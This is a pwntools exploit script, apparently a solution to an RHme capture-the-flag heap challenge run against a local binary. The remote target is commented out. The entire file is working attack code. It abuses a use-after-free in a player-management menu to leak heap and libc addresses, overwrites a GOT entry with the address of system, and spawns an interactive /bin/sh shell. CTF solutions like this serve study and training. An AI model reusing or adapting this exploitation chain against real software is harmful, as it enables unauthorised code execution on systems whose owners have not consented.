from pwn import *

context(arch="x86-64",os='linux')
p = process('./main_mod.elf')

#p = remote('pwn.rhme.riscure.com',1337)

        

libc = ELF('./libc.so.6')
main = ELF('./main.elf')

main_got = main.got.keys()
lib_symb = libc.symbols.keys()

common_symb = list(set(main_got) & set(lib_symb))
print common_symb

main_loc = main.got[common_symb[12]]
lib_off = libc.symbols[common_symb[12]]
sys_off = libc.symbols['system']

def add_player(name, value):
    p.sendline('1')
    p.sendline(name)
    
    #Set the values to the given value since it doesnt matter what they are
    for _ in range(4):
        p.sendline('%s' % value)
        pass
    print p.recvuntil("Your choice:")
    print "ADDED PLAYER %s" % name
    
    
def select_player(i):
    p.sendline('3')
    p.sendline('%s' % i)
    print p.recvuntil("Player selected!")
    name_str = p.recvline()
    val_str = p.recvline()
    print name_str
    print val_str
    print "SELECTED PLAYER %s" % i
    pass
    
def remove_player(i):
    p.sendline('2')
    p.sendline('%s' % i)
    print p.recvuntil("She's gone!")
    print "REMOVED PLAYER %s" % i
    pass
     
def show_player():
    p.sendline('5')
    print p.recvuntil("A/D/S/P: ")
    return p.recvline()
    pass
    
def get_heap_leak():
    select_player(1)
    remove_player(1)
    heap_leak_str = show_player()
    heap_leak = int(heap_leak_str.split(",")[0])
    #heap_leak = u64(p.recvline().strip ().ljust(8,'\x00'))
    print "Heap Leak: %s" % hex(heap_leak)
    return heap_leak
    
        
def edit_selected_name(value):
    p.sendline('4')
    p.sendline('1')
    p.sendline(value)
    p.sendline('0')
    print "NAME CHANGED TO %s" % value
    #res = ""
    #while res != 'break':
        #print p.recvline()
        #res = raw_input("Type break to continue")
        
def attack():
    add_player('AAAAAAAA',1)
    add_player('BBBBBBBB',2)
    add_player('BBBBBBBB',3)
    leak = get_heap_leak()
    edit_selected_name(p64(leak+0x40))
    add_player('YYYYYYYY',4)
    add_player("PWN"*10,9)
    select_player(2)
    edit_selected_name("LIBCLEAK"*2 + p32(main_loc))
    p.sendline('6')
    p.recvuntil('Player 3')
    p.recvuntil('Name: ')
    libc_leak = u64(p.readline().strip('\n').ljust(8, '\x00'))
    sys_addr = libc_leak - lib_off + sys_off
    select_player(3)
    edit_selected_name(p64(sys_addr))
    edit_selected_name('/bin/sh')
    print common_symb
    
    p.interactive()
    
if __name__ == "__main__":
    attack()
    
    
    
    
    
    
    
